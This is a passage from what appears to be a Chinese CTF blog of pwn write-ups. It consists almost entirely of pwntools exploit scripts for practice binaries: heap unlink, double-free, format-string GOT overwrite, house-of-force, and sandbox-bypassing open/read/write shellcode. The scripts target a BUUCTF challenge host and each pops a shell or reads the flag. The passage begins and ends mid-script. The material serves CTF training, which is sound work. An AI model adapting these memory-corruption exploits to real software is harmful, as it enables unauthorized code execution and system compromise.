class="number">1</span>,<span class="number">8</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free)+p64(ptr-<span class="number">0x18</span>)+p64(ptr+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="zctf2016_note2unlink"><a class="markdownIt-Anchor" href="#zctf2016_note2unlink">#</a> zctf2016_note2(unlink)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26179</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./note2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_note</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">index, choice, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#name</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr_0 = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr_0 - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr_0 - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">note0_content = <span class="string">&quot;\x00&quot;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fake_fd) + p64(fake_bk)</span><br><span class="line">new_note(<span class="number">0x80</span>, note0_content) <span class="comment">#note0</span></span><br><span class="line">new_note(<span class="number">0x0</span>, <span class="string">&quot;aa&quot;</span>) <span class="comment">#note1</span></span><br><span class="line">new_note(<span class="number">0x80</span>, <span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#note2</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">note1_content = <span class="string">&quot;\x00&quot;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">new_note(<span class="number">0x0</span>, note1_content)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>) <span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&quot;a&quot;</span> + p64(free_got)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">show_note(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = free_addr - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc address: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, p64(one_gadget)) <span class="comment">#overwrite free got -&gt; system address</span></span><br><span class="line"><span class="comment">#io.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="wdb_2018_1st_babyheapunlinkuaf"><a class="markdownIt-Anchor" href="#wdb_2018_1st_babyheapunlinkuaf">#</a> wdb_2018_1st_babyheap(unlink,uaf)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26136</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./wdb_2018_1st_babyheap&quot;)</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(r, </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x400CF7</span></span><br><span class="line"><span class="string">x/10gx 0x602060</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./wdb_2018_1st_babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">bss_arr = <span class="number">0x602060</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;Choice:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, content</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">0</span>, p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap) + p64(bss_arr-<span class="number">0x10</span>))</span><br><span class="line">payload = p64(bss_arr-<span class="number">0x18</span>) + p64(bss_arr-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br><span class="line">add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(bss_arr-<span class="number">0x18</span>) + p64(bss_arr-<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc;&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>, p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="axb_2019_fmt6464位格式化字符串改got表"><a class="markdownIt-Anchor" href="#axb_2019_fmt6464位格式化字符串改got表">#</a> axb_2019_fmt64（64 位格式化字符串改 got 表）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,29964)</span></span><br><span class="line">io = process(<span class="string">&#x27;axb_2019_fmt64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">sprintf_got = elf.got[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$saaaa&#x27;</span></span><br><span class="line">payload += p64(sprintf_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">sprintf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sprintf_addr:&quot;</span>+<span class="built_in">hex</span>(sprintf_addr)</span><br><span class="line"></span><br><span class="line">libcbase = sprintf_addr - libc.symbols[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + one_gadget[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget % <span class="number">0x10000</span>) - <span class="number">9</span>) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) % <span class="number">0x10000</span>) - (one_gadget % <span class="number">0x10000</span>)) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;payload:&#x27;</span>+payload</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnable_asm沙箱"><a class="markdownIt-Anchor" href="#pwnable_asm沙箱">#</a> pwnable_asm（沙箱)</h1><h2 id="sandbox概述"><a class="markdownIt-Anchor" href="#sandbox概述">#</a> sandbox 概述</h2><p>沙盒机制也就是我们常说的沙箱，英文名 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。<br>  在 ctf 比赛中，pwn 题中的沙盒一般都会限制 execve 的系统调用，这样一来 one_gadget 和 system 调用都不好使，只能采取 open/read/write 的组合方式来读取 flag。<br>一般有两种函数调用方式实现沙盒机制，第一种是采用 prctl 函数调用，第二种是使用 seccomp 库函数。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202172127384.png" alt="image-20220217212749222"></p><p>使用 seccomp-tools 检查沙盒机制，可以看到先是判断了体系架构是否是 x86_64 的，然后对系统调用号进行了判断，只允许了 read/write/open/exit 四种系统调用。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202172139478.png" alt="image-20220217213945397"></p><h2 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="string">&quot;26693&quot;</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./asm&#x27;)</span></span><br><span class="line">shellcode = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;shellcode: &quot;</span>, asm(shellcode))</span><br><span class="line"><span class="built_in">print</span> sh.recvall()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/A951860555/article/details/116738676">https://blog.csdn.net/A951860555/article/details/116738676</a></p><h1 id="bctf2016_bcloudhouse-of-force"><a class="markdownIt-Anchor" href="#bctf2016_bcloudhouse-of-force">#</a> bctf2016_bcloud(house of force)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#house of  force</span></span><br><span class="line">sh = process(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;node4.buuoj.cn&#x27;,28752)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">heap_array_addr = <span class="number">0x0804B120</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Input your name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_addr=&#x27;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#修改top chunk的size</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))</span><br><span class="line">top_chunk_addr = heap_addr + <span class="number">0xD0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;top_chunk_addr=&#x27;</span>,<span class="built_in">hex</span>(top_chunk_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the length of the note content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">offset = heap_array_addr - top_chunk_addr - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27;&#x27;</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#修改heap_array</span></span><br><span class="line">edit(<span 